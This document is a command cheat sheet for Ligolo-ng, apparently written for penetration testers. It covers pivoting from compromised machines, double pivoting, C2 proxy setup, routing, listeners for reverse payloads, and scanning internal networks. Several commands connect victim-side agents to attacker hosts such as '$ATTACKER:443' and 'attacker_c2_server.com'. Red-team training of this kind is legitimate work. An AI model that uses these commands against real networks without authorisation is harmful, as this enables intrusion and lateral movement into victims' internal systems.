# Ligolo-ng 

## Github repo: https://github.com/nicocha30/ligolo-ng

## Precompiled Binaries: https://github.com/nicocha30/ligolo-ng/releases

## OS

1) Linux

2) Windows

3) MacOS

## Simple Tunneling

### 1) On the attacker machine, start a listener

##### Automatically request LetsEncrypt certificates or use self-signed certificates
    
    ./proxy [-autocert | -selfcert] -laddr 0.0.0.0:443

### 2) On the pivot machine, start the agent

    ./agent -connect $ATTACKER:443 [-ignore-cert]

Then, on the server select the opened session and run the autoroute to setup everything automatically. You will have to chose which routes to tunnel, and so on:

    ligolo-ng » session
    [Agent : $SESSION] » autoroute

It is then possible to use all your tools without Proxychains or anything else. Everything will be routed through the tun interface.

## Behind a proxy

In case the client is behind a proxy (for example, a corporate proxy), it can be passed to the client. In this case, the WebSocket mode must be used.

### 1) On the attacker machine, start the listener with HTTPS

##### Automatically request LetsEncrypt certificates or use self-signed certificates
  
    ./proxy [-autocert | -selfcert] -laddr https://0.0.0.0:443

### 2) On the pivot machine, start the agent and specify the proxy address

    ./agent -connect https://$ATTACKER:443 -proxy http://$proxyAddr:$proxyPort [-ignore-cert]

## Double Pivoting

This case is useful when you compromised a first target that can contact your server, and you have also compromised a second machine that is able to contact your first target, and another network, which is the final goal. And this second machine is not able to contact your server.

### 1) On the attacker machine, start the listener

##### Automatically request LetsEncrypt certificates or use self-signed certificates

    ./proxy [-autocert | -selfcert] -laddr 0.0.0.0:443

### 2) On the first pivot machine, start the agent

    ./agent -connect $ATTACKER:443 [-ignore-cert]

### 3) Then, on the server select the opened session and start a new listener

    ligolo-ng » session
    [Agent : $SESSION] » listener_add --addr 0.0.0.0:1080 --to 127.0.0.1:11601

The first agent will listen on 0.0.0.0:1080
Any connections on this ip:port will be relayed to the 11601 TCP local port of the Ligolo-ng daemon.

### 4) Then, on the second pivot machine, run the agent and connect it to the first agent

    ./agent -connect $firstPivot:1080 [-ignore-cert]

A second session will appear on the server. Select it, and run the autoroute command. You can now access the final network.

# Build

- go build -o agent cmd/agent/main.go

- go build -o proxy cmd/proxy/main.go

- Build for Windows

- GOOS=windows go build -o agent.exe cmd/agent/main.go

- GOOS=windows go build -o proxy.exe cmd/proxy/main.go

# Setup

### Linux

- sudo ip tuntap add user YOUR_USERNAME mode tun ligolo

- sudo ip link set ligolo up

- sudo ip route add IP_ADDRESS/SUBNET_MASK dev ligolo ( Configure the routing table so that it will direct traffic that is destined for the IP_ADDRESS/SUBNET_MASK network to be routed through our newly created TUN device.)

### Windows

#### You need to download the Wintun driver (used by WireGuard) and place the wintun.dll in the same folder as Ligolo (make sure you use the right architecture).

#### Links: https://www.wintun.net/

### Start the proxy server on your Command and Control (C2) server (default port 11601):

- ./proxy -h  (Help options)

- ./proxy -autocert (Automatically request LetsEncrypt certificates)

- ./proxy -selfcert (DON'T USE THIS ON A REAL ENGAGEMENT)

# Usage

 -  ./agent -connect attacker_c2_server.com:11601 (Start the agent on your target (victim) computer (no privileges are required!)

## TIP: If you want to tunnel the connection over a SOCKS5 proxy, you can use the --socks ip:port option. You can specify SOCKS credentials using the --socks-user and --socks-pass arguments.

### A session should appear on the proxy server.

 - INFO[0102] Agent joined. name=nchatelain@nworkstation remote="XX.XX.XX.XX:38000" (Example)

### Use the session command to select the agent.

 - ligolo-ng » session 

 - ? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000

### Display the network configuration of the agent using the ifconfig command:

 - [Agent : nchatelain@nworkstation] » ifconfig

### Add a route on the proxy/relay server to the 192.168.0.0/24 agent network.

 - sudo ip route add 192.168.0.0/24 dev ligolo (Linux)

 - netsh int ipv4 show interfaces

 - route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if [THE_INTERFACE_IDX] (Windows)

### Start the tunnel on the proxy

 - [Agent : nchatelain@nworkstation] » tunnel_start

 - [Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   

### You can also specify a custom tuntap interface using the --tun iface option:

 - [Agent : nchatelain@nworkstation] » tunnel_start --tun MY_CUSTOM_TUN_TAP

 - [Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   

### You can now access the 192.168.0.0/24 agent network from the proxy server.

## Examples:

 - $ nmap 192.168.0.0/24 -v -sV -n

 - [...]

 - $ rdesktop 192.168.0.123

 - [...]

# Agent Binding/Listening

### You can listen to ports on the agent and redirect connections to your control/proxy server.

### In a ligolo session, use the listener_add command.

 - [Agent : nchatelain@nworkstation] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp (Creates a TCP listening socket on the agent (0.0.0.0:1234) and redirect connections to the 4321 port of the proxy server)

 - INFO[1208] Listener created on remote agent!

### On the proxy:

 - nc -lvp 4321 (When a connection is made on the TCP port 1234 of the agent, nc will receive the connection.)

## TIP: This is very useful when using reverse tcp/udp payloads.

### You can view currently running listeners using the listener_list command and stop them using the listener_stop [ID] command:

 - listener_list

 - listener_stop ID

## Access to agent's local ports (127.0.0.1)

### If you need to access the local ports of the currently connected agent, there's a "magic" IP hardcoded in Ligolo-ng: 240.0.0.1 ( This IP address is part of an unused IPv4 subnet). If you query this IP address, Ligolo-ng will automatically redirect traffic to the agent's local IP address (127.0.0.1).

#### Example:

 - sudo ip route add 240.0.0.1/32 dev ligolo

 - nmap 240.0.0.1 -sV
